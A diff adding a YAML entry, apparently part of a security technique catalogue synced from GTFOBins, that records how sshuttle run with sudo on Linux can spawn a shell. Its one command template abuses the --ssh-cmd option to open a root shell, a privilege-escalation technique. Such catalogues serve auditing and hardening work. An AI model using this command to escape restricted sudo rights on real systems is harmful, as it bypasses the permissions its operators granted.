@@ -1,0 +1,24 @@
+id: gtfobins/sshuttle/shell/sudo
+type: binary
+platform: linux
+name: sshuttle
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
+references:
+- https://gtfobins.github.io/gtfobins/sshuttle/
+tags:
+- linux
+- unix
+- gtfobins
